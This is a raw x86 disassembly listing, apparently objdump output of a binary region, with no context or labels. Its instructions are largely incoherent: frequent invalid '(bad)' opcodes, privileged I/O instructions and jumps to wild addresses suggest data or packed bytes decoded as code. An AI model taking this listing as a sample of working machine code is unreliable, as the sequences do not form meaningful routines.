  430c02:	loopne 0x430c3f
  430c04:	mov    DWORD PTR [edi],ecx
  430c06:	mov    ebp,ebp
  430c08:	clc    
  430c09:	push   eax
  430c0b:	push   DWORD PTR [ebp-0x4]
  430c0e:	mov    BYTE PTR [ebp+0xa],0xff
  430c12:	(bad)  
  430c13:	int3   
  430c14:	or     BYTE PTR [eax],al
  430c16:	(bad)  
  430c17:	lea    eax,[edi]
  430c19:	ins    BYTE PTR es:[edi],dx
  430c1a:	(bad)  
  430c1b:	inc    DWORD PTR [ecx]
  430c1d:	push   eax
  430c1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430c22:	leave  
  430c23:	les    edx,FWORD PTR [ebp+0x0]
  430c26:	in     al,dx
  430c27:	call   DWORD PTR [ecx-0x75]
  430c2a:	inc    ebp
  430c2b:	cld    
  430c2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430c32:	cld    
  430c33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430c39:	sti    
  430c3a:	mov    eax,DWORD PTR [eax]
  430c3c:	clc    
  430c3d:	test   eax,esi
  430c3f:	je     0x430cb6
  430c41:	mov    eax,esi
  430c43:	cld    
  430c44:	add    al,0x80
  430c46:	add    WORD PTR [ecx+0x0],ax
  430c4a:	fadd   DWORD PTR [eax]
  430c4c:	mov    BYTE PTR [eax],0xd4
  430c4f:	push   0xffffffc3
  430c51:	push   edi
  430c52:	mov    edx,DWORD PTR [eax+0x51]
  430c55:	pop    edi
  430c56:	lea    ebx,[ebx-0x8]
  430c59:	ret    0x45
  430c5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c62:	xchg   eax,edi
  430c64:	mov    DWORD PTR [ebp-0x75],ecx
  430c67:	push   esi
  430c68:	clc    
  430c69:	jne    0x430c3b
  430c6b:	mov    ecx,0xf8450b0b
  430c70:	(bad)  
  430c71:	push   cs
  430c72:	or     BYTE PTR [ebp-0x3a],dh
  430c75:	cmp    eax,DWORD PTR [ecx]
  430c77:	pop    esi
  430c78:	(bad)  
  430c79:	or     al,0x5
  430c7b:	inc    eax
  430c7c:	leave  
  430c7d:	call   0x21994e86
  430c82:	iret   
  430c83:	inc    eax
  430c84:	leave  
  430c85:	jmp    0xd8ce4d89
  430c8a:	mov    eax,DWORD PTR [edx-0x3a]
  430c8d:	jl     0x430c83
  430c8f:	inc    eax
  430c90:	nop
  430c91:	loop   0x430c92
  430c93:	ret    
  430c94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c9a:	add    eax,0xff45e8f8
  430c9f:	push   esi
  430ca0:	push   DWORD PTR [ebp-0x39]
  430ca3:	mov    eax,0x7e9da46
  430ca8:	or     al,0x6
  430caa:	push   DWORD PTR [ebp-0x3a]
  430cad:	cmp    eax,DWORD PTR [edx]
  430caf:	pop    esi
  430cb0:	ret    
  430cb1:	or     al,0x56
  430cb3:	inc    ecx
  430cb4:	push   ebp
  430cb5:	jl     0x430ca3
  430cb7:	inc    edx
  430cb8:	inc    ebp
  430cb9:	leave  
  430cba:	add    DWORD PTR [ecx+0x28],eax
  430cbd:	and    esp,edi
  430cbf:	inc    ecx
  430cc0:	jne    0x430ca9
  430cc2:	add    DWORD PTR [edx+0x1c],eax
  430cc5:	enter  0xc38b,0x14
  430cc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430ccf:	clc    
  430cd0:	enter  0xd345,0x56
  430cd4:	div    DWORD PTR [ebp+0x50]
  430cd7:	mov    eax,0x7c80ece
  430cdc:	rol    DWORD PTR [esi],cl
  430cde:	div    DWORD PTR [ebp+0x50]
  430ce1:	cmp    ecx,edx
  430ce3:	pop    esi
  430ce4:	dec    BYTE PTR [edx]
  430ce6:	in     al,dx
  430ce7:	inc    edx
  430ce8:	sub    ebp,ebp
  430cea:	inc    eax
  430ceb:	(bad)  
  430cec:	push   eax
  430ced:	add    edx,DWORD PTR [eax-0x13]
  430cf0:	push   edi
  430cf1:	add    dh,dh
  430cf3:	leave  
  430cf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cf8:	add    BYTE PTR [ecx+0x0],dl
  430cfb:	inc    ebp
  430cfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d02:	add    BYTE PTR [eax-0x7fbf448],bh
  430d08:	add    al,0x2
  430d0a:	jmp    0x57eb864
  430d0f:	jne    0x430cf9
  430d11:	mov    eax,DWORD PTR [edx]
  430d13:	or     BYTE PTR [eax],al
  430d15:	inc    ecx
  430d16:	stc    
  430d17:	jmp    0xe7824d52
  430d1c:	jge    0x430d5f
  430d1e:	mov    esi,ebp
  430d20:	lock ret 0x7d
  430d24:	and    ecx,DWORD PTR [ebx-0x171777]
  430d2a:	add    bh,bh
  430d2c:	aad    0xd7
  430d2e:	add    dh,cl
  430d30:	clts   
  430d32:	(bad)  
  430d33:	call   0xffce0c38
  430d38:	hlt    
  430d39:	iret   
  430d3a:	jge    0x430d12
  430d3c:	rol    DWORD PTR [esi-0x80],cl
  430d3f:	cmc    
  430d40:	or     BYTE PTR [edi-0x27],cl
  430d43:	(bad)  
  430d44:	out    dx,al
  430d45:	mov    eax,DWORD PTR [ebx]
  430d47:	(bad)  
  430d48:	pop    esi
  430d49:	push   es
  430d4a:	cmp    al,0xe8
  430d4c:	sar    edi,0x8
  430d4f:	inc    DWORD PTR [edi]
  430d51:	inc    esi
  430d52:	(bad)  
  430d53:	loop   0x430dd3
  430d55:	push   edi
  430d56:	push   cs
  430d57:	push   ebx
  430d58:	add    BYTE PTR [ebx+0x24008b56],cl
  430d5e:	add    BYTE PTR [ebp+0x50],al
  430d61:	push   eax
  430d62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d68:	sub    edx,DWORD PTR [esi-0x24]
  430d6b:	jne    0x430d23
  430d6d:	lods   eax,DWORD PTR ds:[esi]
  430d6e:	mov    edx,DWORD PTR [edx-0x34]
  430d71:	dec    esi
  430d72:	out    0x83,eax
  430d74:	into   
  430d75:	push   edi
  430d77:	loopne 0x430d47
  430d79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d84:	rol    DWORD PTR [edx],0x8
  430d87:	mov    esp,ecx
  430d89:	cmp    DWORD PTR [ebx],0xc
  430d8c:	mov    esi,0x5001c0
  430d91:	push   eax
  430d92:	push   cs
  430d93:	push   eax
  430d94:	(bad)  
  430d95:	sub    edx,edi
  430d97:	push   esi
  430d98:	adc    al,0xcb
  430d9a:	ins    DWORD PTR es:[edi],dx
  430d9b:	mov    eax,0x203e8
  430da0:	add    al,ah
  430da2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430da9:	add    dh,al
  430dab:	add    ah,ch
  430dad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430db3:	pop    ecx
  430db4:	or     eax,ebx
  430db6:	cli    
  430db7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430dbd:	lea    ebp,[ebx]
  430dbf:	mov    edx,DWORD PTR [edx-0x4]
  430dc2:	dec    ecx
  430dc3:	inc    ebp
  430dc4:	shr    BYTE PTR [ebx],0x4b
  430dc7:	and    al,0x0
  430dc9:	(bad)  
  430dca:	jne    0x430e11
  430dcc:	pop    eax
  430dcd:	mov    al,0x5a
  430dcf:	call   0x142102e
  430dd4:	and    al,0x85
  430dd6:	push   edx
  430dd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430ddb:	dec    ebp
  430ddc:	mov    cl,0x23
  430dde:	jmp    0x430dcc
  430de0:	mov    al,0xe7
  430de2:	call   0x13910d0
  430de7:	shr    DWORD PTR [eax+ebx*2],cl
  430dea:	lock (bad) 
  430dec:	adc    eax,0x757f008d
  430df1:	out    0x58,eax
  430df3:	cmp    al,0x7
  430df5:	pop    edx
  430df6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dfd:	push   ecx
  430dfe:	cld    
  430dff:	mov    esi,0x3b0175
  430e04:	and    al,0xb0
  430e06:	xor    BYTE PTR [edx+0x1],0x8b
  430e0a:	add    ah,bh
  430e0c:	mov    edi,DWORD PTR [ebp-0x4]
  430e0f:	psubsw mm7,QWORD PTR [edi]
  430e12:	add    DWORD PTR [ebp+0x0],ebp
  430e15:	rcr    eax,1
  430e17:	mov    edi,ecx
  430e19:	and    eax,DWORD PTR [eax]
  430e1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e21:	call   0x130110a
  430e26:	add    al,cl
  430e28:	mov    ebp,esi
  430e2a:	aam    0x83
  430e2c:	or     DWORD PTR [ecx],eax
  430e2e:	jne    0x430e21
  430e30:	mov    eax,DWORD PTR [eax]
  430e32:	aam    0x0
  430e34:	dec    ebp
  430e35:	jne    0x430dc2
  430e37:	cmp    ebx,eax
  430e39:	jb     0x430e88
  430e3b:	jmp    0x430dc8
  430e3d:	mov    ebx,esp
  430e3f:	int3   
  430e40:	dec    ebp
  430e41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e48:	mov    edx,0x8b0a8b
  430e4d:	cmp    ecx,DWORD PTR [eax]
  430e4f:	jb     0x430e28
  430e51:	pop    edx
  430e52:	push   edi
  430e53:	cli    
  430e54:	pop    es
  430e55:	mov    eax,ecx
  430e57:	jb     0x430e5b
  430e59:	add    DWORD PTR [ebx],0xa
  430e5c:	mov    eax,DWORD PTR [ebx]
  430e5e:	int3   
  430e5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e65:	jmp    0x430df2
  430e67:	mov    al,0xe8
  430e69:	call   0x10410eb
  430e6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e71:	pop    edi
  430e72:	or     BYTE PTR [ecx-0x73],bl
  430e75:	pop    ecx
  430e76:	inc    edi
  430e77:	xor    al,0xeb
  430e79:	push   ecx
  430e7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e80:	call   0xb20f85
  430e85:	int3   
  430e86:	sbb    BYTE PTR [esi],ch
  430e88:	inc    ebp
  430e89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e8f:	call   0x9c10fe
  430e94:	or     BYTE PTR [ebx-0x73],dl
  430e97:	cmp    al,0x47
  430e99:	mov    al,0x1
  430e9b:	jb     0x430e9d
  430e9d:	mov    al,0x10
  430e9f:	push   eax
  430ea0:	add    al,0x75
  430ea2:	add    BYTE PTR [ebx],ch
  430ea4:	add    ebx,esp
  430ea6:	int3   
  430ea7:	jne    0x430eb9
  430ea9:	movsx  edx,cl
  430eac:	add    DWORD PTR [eax],eax
  430eae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430eb5:	mov    gs,edi
  430eb7:	add    BYTE PTR [eax-0x50],ch
  430eba:	add    al,ch
  430ebc:	mov    eax,DWORD PTR [ecx]
  430ebe:	sub    eax,DWORD PTR [eax]
  430ec0:	jb     0x430f37
  430ec2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ec6:	jge    0x430eb0
  430ec8:	add    al,0x1
  430eca:	add    DWORD PTR [eax],0x0
  430ecd:	jne    0x430ecf
  430ecf:	je     0x430f16
  430ed1:	mov    eax,DWORD PTR [edi]
  430ed3:	ror    BYTE PTR [ebp+0x4d],1
  430ed6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430edd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ee3:	mov    DWORD PTR [ebx],ebp
  430ee5:	fadd   DWORD PTR [eax+0x75]
  430ee8:	inc    eax
  430ee9:	pop    eax
  430eea:	lea    ebx,[ecx+0x4f]
  430eed:	push   0xb1000003
  430ef2:	out    dx,eax
  430ef3:	add    ebp,DWORD PTR [edx+edx*2]
  430ef6:	add    BYTE PTR [ebx+ecx*4],bh
  430ef9:	mov    ch,BYTE PTR [ebx]
  430efb:	jb     0x430f6f
  430efd:	add    al,0x89
  430eff:	push   eax
  430f00:	call   0x842b5c72
  430f05:	add    DWORD PTR [eax+eax*1],eax
  430f08:	jae    0x430f1e
  430f0a:	icebp  
  430f0b:	inc    ebp
  430f0c:	mov    eax,DWORD PTR gs:[ecx]
  430f0f:	int3   
  430f10:	out    dx,al
  430f11:	loopne 0x430f60
  430f13:	sub    eax,DWORD PTR [edx]
  430f15:	push   0xffffff83
  430f17:	pop    esi
  430f18:	push   cs
  430f19:	jl     0x430f34
  430f1b:	add    al,0xaf
  430f1d:	xor    eax,0x832b6d00
  430f22:	mov    eax,DWORD PTR [edx]
  430f24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f30:	inc    ebp
  430f31:	shr    ebx,0x3
  430f34:	or     DWORD PTR [eax],0x4
  430f37:	push   0xffffffa5
  430f39:	pop    esi
  430f3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f41:	jmp    0x430fa0
  430f43:	mov    edi,0xff0272
  430f48:	fdivr  QWORD PTR [ebp+0x5d]
  430f4b:	push   0x4e
  430f4d:	pop    ecx
  430f4e:	call   0x435353
  430f53:	mov    DWORD PTR [ebx],eax
  430f55:	in     al,0xc8
  430f57:	rol    BYTE PTR [ebp-0x75],0xc1
  430f5b:	call   0xad113c
  430f60:	pop    esi
  430f61:	enter  0xceff,0x8b
  430f65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f70:	je     0x430f72
  430f72:	or     DWORD PTR [ebx-0x74183b24],eax
  430f78:	jne    0x430f5e
  430f7a:	jmp    0x430f75
  430f7c:	push   DWORD PTR [edx-0x24]
  430f7f:	push   0x4d
  430f81:	pop    ecx
  430f82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f86:	jge    0x430f8e
  430f88:	mov    eax,eax
  430f8a:	sub    ebp,DWORD PTR [edx+0x24]
  430f8d:	pop    esi
  430f8e:	inc    ebp
  430f8f:	mov    esp,0x8b6077
  430f94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f9a:	lods   al,BYTE PTR ds:[esi]
  430f9b:	add    BYTE PTR [ebx],bh
  430f9d:	enter  0xce73,0x49
  430fa1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fa9:	stc    
  430faa:	jge    0x43101e
  430fac:	jnp    0xdd42931b
  430fb2:	call   0xc61088
  430fb7:	fadd   st(0),st
  430fb9:	dec    esi
  430fba:	ins    BYTE PTR es:[edi],dx
  430fbb:	stc    
  430fbc:	cmp    al,0x73
  430fbe:	push   ebp
  430fbf:	mov    eax,0xf8028b
  430fc4:	jne    0x430f87
  430fc6:	mov    esi,ecx
  430fc8:	mov    esp,DWORD PTR [ebp+0x2c]
  430fcb:	add    edi,DWORD PTR [ebp-0x24]
  430fce:	sub    esp,eax
  430fd0:	and    al,0x45
  430fd2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430fd8:	sbb    al,0xee
  430fda:	pop    esi
  430fdb:	call   0x83100b
  430fe0:	fsubr  st,st(3)
  430fe2:	sti    
  430fe3:	add    BYTE PTR gs:[ecx],bh
  430fe6:	add    eax,esp
  430fe8:	add    DWORD PTR [esi],eax
  430fea:	rol    DWORD PTR [ebp+0x8],0x29
  430fee:	mov    esp,eax
  430ff0:	clc    
  430ff1:	jne    0x431068
  430ff3:	mov    eax,0x8b0673
  430ff8:	loopne 0x43103f
  430ffa:	loopne 0x430f85
  430ffc:	lods   al,BYTE PTR ds:[esi]
  430ffd:	int3   
  430ffe:	inc    ebp
  430fff:	mov    DWORD PTR gs:[eax+edi*8],eax
  431003:	add    al,0xc3
  431005:	sub    ecx,DWORD PTR [ebp+0x47]
  431008:	(bad)  
  43100a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43100e:	add    eax,DWORD PTR [eax]
  431010:	call   0x644d115
  431015:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43101b:	dec    esi
  43101c:	ins    DWORD PTR es:[edi],dx
  43101d:	in     al,dx
  43101e:	lea    eax,[eax]
  431020:	inc    ebp
  431021:	inc    ebp
  431022:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431028:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431032:	and    al,0xdc
  431034:	ror    DWORD PTR [edx+0x24],0xf7
  431038:	or     BYTE PTR [ebp+0x4c],dh
  43103b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43103f:	stos   BYTE PTR es:[edi],al
  431040:	adc    edx,edi
  431042:	inc    esp
  431043:	add    edi,DWORD PTR [eax]
  431045:	jne    0x43102a
  431047:	mov    DWORD PTR [eax-0x7449db04],ecx
  43104d:	cmp    ecx,DWORD PTR [edi]
  43104f:	sub    BYTE PTR [ebp-0x7e],dl
  431052:	sar    ebp,0xb
  431055:	jmp    FWORD PTR [edi+0x2400392a]
  43105b:	sub    esi,DWORD PTR [ebx-0x73]
  43105e:	mov    esp,DWORD PTR [ecx+edi*4]
  431061:	mov    ecx,DWORD PTR [eax]
  431063:	and    BYTE PTR [eax],al
  431065:	jne    0x431031
  431067:	sub    ebp,ecx
  431069:	sbb    BYTE PTR [esi+0x32],ah
  43106c:	dec    ebp
  43106d:	push   ebp
  43106e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431074:	ret    
  431075:	mov    edx,ebp
  431077:	leave  
  431078:	sub    DWORD PTR [esi+0x24],ebx
  43107b:	ret    0x2b
  43107e:	pop    ax
  431080:	push   ebp
  431081:	rol    BYTE PTR [ebx],0xeb
  431084:	add    DWORD PTR [ecx+0x6c0001],0x40
  43108b:	jb     0x4310e2
  43108d:	ret    
  43108e:	in     al,dx
  43108f:	jecxz  0x43101c
  431091:	push   esi
  431092:	xchg   esp,eax
  431093:	jne    0x431095
  431095:	cmp    edx,DWORD PTR [esi+0x1c]
  431098:	jne    0x43107e
  43109a:	mov    eax,DWORD PTR [ebp-0x77]
  43109d:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310a4:	mov    esi,DWORD PTR [ebp-0x75]
  4310a7:	pop    esi
  4310a8:	nop
  4310a9:	mov    eax,DWORD PTR [eax]
  4310ab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310b1:	add    al,0x0
  4310b3:	inc    ebp
  4310b4:	mov    eax,DWORD PTR [ebx]
  4310b6:	mov    ebp,ebx
  4310b8:	cmp    al,0xf
  4310ba:	or     al,al
  4310bc:	inc    ebp
  4310bd:	inc    ebp
  4310be:	xor    eax,0x8bc89c8b
  4310c3:	ins    BYTE PTR es:[edi],dx
  4310c4:	cld    
  4310c5:	add    BYTE PTR [edi+0x536c16c0],dh
  4310cb:	add    BYTE PTR [ecx-0x5],dl
  4310ce:	add    eax,0x17200
  4310d3:	sbb    al,0x85
  4310d5:	dec    esp
  4310d6:	je     0x431110
  4310d8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310dc:	add    BYTE PTR [ebx],bh
  4310de:	(bad)  
  4310df:	and    al,0x34
  4310e1:	jae    0x43107f
  4310e3:	mov    cl,cl
  4310e5:	inc    DWORD PTR [esp]
  4310e8:	push   ebp
  4310e9:	shr    esp,0x8
  4310ec:	in     al,dx
  4310ed:	push   esp
  4310ee:	add    DWORD PTR [eax],esp
  4310f0:	add    bl,cl
  4310f2:	inc    ebp
  4310f3:	mov    bh,0x89
  4310f5:	add    ah,bh
  4310f7:	jmp    0xca772041
  4310fc:	pushf  
  4310fd:	dec    esp
  4310fe:	push   ebx
  4310ff:	and    BYTE PTR [ebp+0x17],al
  431102:	xor    eax,0x56009cd9
  431107:	add    BYTE PTR [ebp+0x2b],al
  43110a:	in     eax,0xc1
  43110c:	inc    ebp
  43110d:	add    eax,0xc601d8
  431112:	mov    al,0xc6
  431115:	ins    BYTE PTR es:[edi],dx
  431116:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43111d:	dec    esp
  43111e:	xor    esp,DWORD PTR [eax]
  431120:	(bad)  
  431121:	fxch   st(1)
  431123:	sub    DWORD PTR [ebx],esi
  431125:	add    BYTE PTR [edx-0x40],bl
  431128:	mov    eax,0x248d8d00
  43112e:	xor    eax,0x188b0fc3
  431133:	push   ecx
  431134:	fimul  DWORD PTR [edx+0x8801d9]
  43113a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431141:	xor    ebx,ebp
  431143:	mov    al,BYTE PTR [ebp+0x1]
  431146:	jmp    0xdb4c564b
  43114b:	mov    dl,0x45
  43114d:	add    esi,ebp
  43114f:	add    BYTE PTR [ebp+0xe],al
  431152:	sub    DWORD PTR [edx+0x2e0145],eax
  431158:	inc    ebp
  431159:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43115d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431161:	cld    
  431162:	mov    dh,0xa5
  431164:	xor    edi,eax
  431166:	add    eax,DWORD PTR [ebp+0x46]
  431169:	prefetcht0 BYTE PTR [ecx-0x2]
  43116d:	xor    eax,0x7c60872
  431172:	mov    esp,0xbd32c69a
  431177:	pop    esi
  431178:	mov    cl,0xbe
  43117b:	or     al,0xc6
  43117d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431184:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43118b:	add    dh,al
  43118d:	mov    eax,ebx
  43118f:	xor    DWORD PTR [ebx],0x35008dbc
  431195:	mov    ecx,DWORD PTR [edi]
  431197:	sbb    al,0x18
  431199:	inc    ebp
  43119a:	fcmovb st,st(7)
  43119c:	fxtract 
  43119e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4311a4:	in     eax,dx
  4311a5:	call   0xf942972f
  4311aa:	inc    esi
  4311ac:	inc    ebp
  4311ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4311b3:	push   edi
  4311b4:	adc    eax,DWORD PTR [ebp-0x77]
  4311b7:	out    0x8b,eax
  4311b9:	inc    ebp
  4311ba:	cmp    BYTE PTR [ecx],ch
  4311bc:	inc    DWORD PTR [ebp+0x3b]
  4311bf:	inc    ebp
  4311c0:	jne    0x4311f0
  4311c2:	(bad)  
  4311c3:	(bad)  
  4311c4:	mov    eax,0xf87c8545
  4311c9:	test   BYTE PTR [ebp-0x47],0xea
  4311cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4311d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4311db:	inc    esi
  4311dc:	test   DWORD PTR [eax],ebx
  4311de:	add    bh,dh
  4311e0:	add    BYTE PTR [edx+0x45],dh
  4311e3:	(bad)  
  4311e4:	mov    ebx,esp
  4311e6:	jl     0x4311ae
  4311e8:	add    ch,bl
  4311ea:	mov    esi,eax
  4311ec:	mov    ebx,esi
  4311ee:	cld    
  4311ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4311f6:	cmp    dh,al
  4311f8:	imul   esp,ecx,0xe28dc600
  4311fe:	shl    DWORD PTR [ebx],1
  431200:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431206:	mov    ebx,DWORD PTR [eax]
  431208:	data16 fiadd DWORD PTR [ebp-0x770027]
  43120f:	add    eax,0x7
  431212:	in     ax,dx
  431214:	test   DWORD PTR [ebp-0x1],eax
  431217:	jmp    0xe48a581b
  43121c:	inc    bp
  43121e:	test   eax,esp
  431220:	inc    DWORD PTR [ebp-0x1]
  431223:	cmc    
  431224:	rol    BYTE PTR [ebp+0x66],0xdf
  431228:	test   DWORD PTR [ebp-0x1],eax
  43122b:	in     al,dx
  43122c:	inc    DWORD PTR [ebp+0x47]
  43122f:	out    0x66,eax
  431231:	inc    ebp
  431232:	test   DWORD PTR [edi+edi*8-0xa],edi
  431236:	inc    DWORD PTR [eax+eax*8-0x44]
  43123a:	data16 mov dh,0x85
  43123d:	xor    edi,edi
  43123f:	add    edi,edi
  431241:	inc    esi
  431242:	inc    edi
  431243:	sbb    BYTE PTR [esi-0x2],ah
  431246:	test   DWORD PTR [edx-0x1],esi
  431249:	(bad)  
  43124a:	(bad)  
  43124b:	cmp    bh,al
  43124d:	dec    DWORD PTR [ecx-0x278b77]
  431253:	dec    ebp
  431254:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43125b:	add    edi,edi
  43125d:	lea    edi,[eax+0xff99ff]
  431263:	enter  0xe89,0x78
  431267:	inc    ebp
  431268:	push   DWORD PTR ds:0xc7829cb8
  43126e:	add    BYTE PTR [eax-0x7857a77],bh
  431274:	inc    DWORD PTR [ebp-0x48]
  431277:	mov    edx,edi
  431279:	mov    WORD PTR [eax],es
  43127b:	add    BYTE PTR [ecx-0xf083c7],cl
  431281:	pop    edi
  431282:	add    DWORD PTR [eax],0xffffffe4
  431285:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43128b:	add    DWORD PTR [eax+0x382700],edi
  431291:	inc    ebp
  431292:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431298:	add    BYTE PTR [ecx+0x4f45b866],cl
  43129e:	lea    eax,[eax]
  4312a0:	add    eax,0x89660878
  4312a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4312ac:	loopne 0x431237
  4312ae:	(bad)  
  4312af:	data16 aam 0xff
  4312b2:	in     al,dx
  4312b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4312b8:	pop    ecx
  4312b9:	push   0x8ddaff18
  4312be:	jmp    0x4312bf
  4312c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4312c6:	lea    eax,[ebx-0x767aee30]
  4312cc:	(bad)  
  4312cd:	ins    BYTE PTR es:[edi],dx
  4312ce:	(bad)  
  4312cf:	inc    DWORD PTR [ebp-0xfb0173]
  4312d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4312db:	adc    DWORD PTR [ecx+0x3d],0x33
  4312df:	mov    DWORD PTR [ebx+0xff7270],edi
  4312e5:	(bad)  
  4312e6:	ret    
  4312e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4312ed:	call   DWORD PTR [eax-0x75]
  4312f0:	inc    ebp
  4312f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4312f8:	mov    eax,0x85ff66b0
  4312fe:	add    edi,edi
  431300:	add    bh,bh
  431302:	(bad)  
  431303:	stc    
  431304:	inc    DWORD PTR [eax]
  431306:	or     BYTE PTR [esi+0x45],ah
  431309:	test   DWORD PTR [ebp-0x7e008a01],eax
  43130f:	outs   dx,BYTE PTR ds:[esi]
  431310:	pop    DWORD PTR [eax]
  431312:	adc    ah,BYTE PTR [esi-0x78]
  431315:	test   DWORD PTR [eax-0x1],esi
  431318:	mov    ecx,0x6b4fff
  43131d:	add    cl,al
  43131f:	mov    WORD PTR [ebp-0x3f0078],ax
  431326:	mov    eax,eax
  431328:	data16 push bp
  43132b:	test   DWORD PTR [ebp-0x76000201],ecx
  431331:	dec    esp
  431332:	mov    WORD PTR [eax],es
  431334:	ret    0x6666
  431337:	inc    ebp
  431338:	push   ebp
  431339:	mov    eax,0xf3478d
  43133e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431344:	pushw  0x55
  431347:	lea    ax,[ebp-0x1f]
  43134b:	(bad)  
  43134c:	mov    eax,edx
  43134e:	xchg   esp,eax
  43134f:	in     al,0x89
  431351:	cmc    
  431352:	xchg   esi,eax
  431353:	inc    ebp
  431354:	iret   
  431355:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43135b:	ror    BYTE PTR [ebx+0x5532668a],1
  431361:	or     BYTE PTR [ebx+0x55186639],0x49
  431368:	(bad)  
  431369:	repz cmp eax,0xa0898945
  43136f:	mov    ah,0x89
  431371:	jmp    DWORD PTR [edx+0x66b0418d]
  431377:	inc    DWORD PTR [ebp+0x50]
  43137a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43137e:	mov    DWORD PTR [eax],ecx
  431380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431381:	pop    es
  431382:	inc    ecx
  431383:	(bad)  
  431384:	call   0x366:0x3245
  43138a:	dec    ebp
  43138b:	push   eax
  43138c:	inc    bp
  43138e:	jge    0x431313
  431390:	mov    esp,DWORD PTR [esi-0x18]
  431393:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431399:	add    DWORD PTR [ebx],esi
  43139b:	add    BYTE PTR [ebx],al
  43139d:	test   DWORD PTR [ebx],esi
  43139f:	(bad)  
  4313a0:	inc    WORD PTR [ebp+0x0]
  4313a4:	mov    eax,DWORD PTR [eax]
  4313a6:	call   0x8898cadb
  4313ab:	mov    esi,eax
  4313ad:	clc    
  4313ae:	ret    
  4313af:	rol    cl,0xa
  4313b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313b8:	mov    edx,edi
  4313ba:	pushf  
  4313bb:	pop    es
  4313bc:	jmp    DWORD PTR [edx+0x66]
  4313bf:	add    BYTE PTR [ebp-0x990175],al
  4313c5:	inc    ebp
  4313c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4313cc:	push   ebp
  4313cd:	mov    edi,eax
  4313cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4313d5:	push   ebp
  4313d6:	add    BYTE PTR [ebx-0x764b0777],al
  4313dc:	dec    DWORD PTR [esi+0x661851e8]
  4313e2:	add    BYTE PTR [ebp-0x7b],dl
  4313e5:	cmp    esi,0xfffffff3
  4313e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4313ee:	jmp    DWORD PTR [esi-0x75]
  4313f1:	push   ebp
  4313f2:	hlt    
  4313f3:	data16 (bad) 
  4313f5:	dec    ebp
  4313f6:	ret    
  4313f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313fd:	lea    edx,[eax-0x1]
  431400:	jne    0x4313d3
  431402:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431408:	dec    BYTE PTR [ecx+0x51559eff]
  43140e:	mov    DWORD PTR [esi-0x4c],esp
  431411:	push   ebp
